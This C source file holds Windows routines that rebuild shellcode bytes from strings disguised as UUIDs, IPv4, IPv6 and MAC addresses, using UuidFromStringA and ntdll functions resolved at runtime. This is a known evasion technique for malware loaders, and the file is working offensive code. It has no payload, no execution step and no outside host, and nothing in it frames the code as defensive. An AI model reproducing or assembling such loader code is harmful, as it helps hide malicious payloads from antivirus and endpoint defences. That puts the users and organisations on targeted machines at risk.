#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

typedef LONG (WINAPI *RtlIpv4StringToAddressA_t)(PCSTR, BOOLEAN, PCSTR*, PVOID);
typedef LONG (WINAPI *RtlIpv6StringToAddressA_t)(PCSTR, PCSTR*, PVOID);
typedef LONG (WINAPI *RtlEthernetStringToAddressA_t)(PCSTR, PCSTR*, PVOID);

// Deobfuscate UUID strings back to shellcode bytes
void deobfuscate_uuid(const char* uuids[], int count, unsigned char* out_buf) {
    for (int i = 0; i < count; i++) {
        UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)&out_buf[i * 16]);
    }
}

// Deobfuscate IPv4 strings
void deobfuscate_ipv4(const char* strings[], int count, unsigned char* out_buf) {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) return;
    RtlIpv4StringToAddressA_t pRtlIpv4StringToAddressA = (RtlIpv4StringToAddressA_t)GetProcAddress(hNtdll, "RtlIpv4StringToAddressA");
    if (!pRtlIpv4StringToAddressA) return;

    PCSTR terminator;
    for(int i=0; i<count; i++) {
        pRtlIpv4StringToAddressA(strings[i], FALSE, &terminator, &out_buf[i*4]);
    }
}

// Deobfuscate IPv6 strings
void deobfuscate_ipv6(const char* strings[], int count, unsigned char* out_buf) {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) return;
    RtlIpv6StringToAddressA_t pRtlIpv6StringToAddressA = (RtlIpv6StringToAddressA_t)GetProcAddress(hNtdll, "RtlIpv6StringToAddressA");
    if (!pRtlIpv6StringToAddressA) return;

    PCSTR terminator;
    for(int i=0; i<count; i++) {
        pRtlIpv6StringToAddressA(strings[i], &terminator, &out_buf[i*16]);
    }
}

// Deobfuscate MAC strings
void deobfuscate_mac(const char* strings[], int count, unsigned char* out_buf) {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) return;
    RtlEthernetStringToAddressA_t pRtlEthernetStringToAddressA = (RtlEthernetStringToAddressA_t)GetProcAddress(hNtdll, "RtlEthernetStringToAddressA");
    if (!pRtlEthernetStringToAddressA) return;

    PCSTR terminator;
    for(int i=0; i<count; i++) {
        pRtlEthernetStringToAddressA(strings[i], &terminator, &out_buf[i*6]);
    }
}
